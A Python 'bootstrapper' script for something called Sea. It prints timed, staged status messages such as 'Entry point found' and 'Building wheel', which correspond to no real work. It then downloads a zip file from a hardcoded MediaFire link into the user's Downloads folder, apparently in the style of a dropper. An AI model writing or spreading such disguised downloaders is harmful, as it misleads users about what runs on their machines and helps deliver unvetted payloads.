import os
import requests
import sys
import time
import threading
from colorama import Fore, Style, init
from pystyle import Colors, Colorate, Center

os.system('title Sea Boostraper')

init(autoreset=True)

os.system('cls')

def install_package(package):
    print(f"{Fore.BLUE}[info]{Style.RESET_ALL} {Fore.WHITE}Installing {package}...{Style.RESET_ALL}")
    os.system(f"pip install {package}")
    print(f"{Fore.WHITE}{package} installed successfully.{Style.RESET_ALL}\n")

def display_loading_spinner():
    spinner = ['|', '/', '-', '\\']
    while not download_complete:
        for symbol in spinner:
            sys.stdout.write(f'\r{Fore.GREEN}[DOWNLOAD]{Style.RESET_ALL} {Fore.WHITE}Downloading file {symbol}{Style.RESET_ALL}')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * (len(f'{Fore.BLUE}[info]{Style.RESET_ALL} {Fore.WHITE}Downloading file {symbol}{Style.RESET_ALL}')) + '\r')
        sys.stdout.flush()

try:
    import requests
    import pystyle
except ModuleNotFoundError as e:
    missing_package = str(e).split("'")[1]
    print(f"{Fore.BLUE}[info]{Style.RESET_ALL} {Fore.WHITE}Missing package detected: {missing_package}{Style.RESET_ALL}")
    install_package(missing_package)

from pystyle import Colors, Colorate, Center

banner_text = """
   _____ _________ 
  / ___// ____/   |     
  \__ \/ __/ / /| |     
 ___/ / /___/ ___ |      
/____/_____/_/  |_|       
                                                     
"""
banner = Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(banner_text))
print(banner)

def download_file(url, download_folder):
    global download_complete
    download_complete = False
    try:
        print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {Fore.WHITE}Preparing to download file...{Style.RESET_ALL}")
        time.sleep(5)
        print(f"{Fore.YELLOW}[WARN]{Style.RESET_ALL} {Fore.WHITE}This protocol may took 1-2 minutes{Style.RESET_ALL}")
        time.sleep(5)
        print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {Fore.WHITE}Entry point found{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {Fore.WHITE}Building wheel...{Style.RESET_ALL}")
        time.sleep(6)
        print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {Fore.WHITE}Sea download protocol started{Style.RESET_ALL}")
        
        spinner_thread = threading.Thread(target=display_loading_spinner)
        spinner_thread.start()
        
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Check for request errors

        filename = url.split('/')[-1]
        download_path = os.path.join(download_folder, filename)

        with open(download_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        download_complete = True
        spinner_thread.join()

        print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {Fore.WHITE}File downloaded successfully and saved as {download_path}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {Fore.WHITE}Sea download protocol has completed{Style.RESET_ALL}")
    
    except requests.exceptions.RequestException as e:
        sys.stdout.write('\n')
        print(f"{Fore.RED}[FAILED]{Style.RESET_ALL} {Fore.WHITE}Error: {e}{Style.RESET_ALL}")

file_url = "https://download1527.mediafire.com/mw65rct6uz4g9TjT58N_eovkkB5VQgx3tziotLrYOTZu2mqaYm8NZPNjwpsFYugXDsENph8L8ZI9h98pmIVoYRIfImKsMiOnpJki7LeyvK6_4O6F9QGPvVcVco4AueVsyEg2-hriw6uJJLDoWEGGlaG5YYJfB_6mw1DZ-LiXzekq/86jleya6ttgc40u/Sea.zip"

downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

download_file(file_url, downloads_folder)

input(f"{Fore.BLUE}[INFO]{Style.RESET_ALL} {Fore.WHITE}Press Enter to exit...{Style.RESET_ALL}")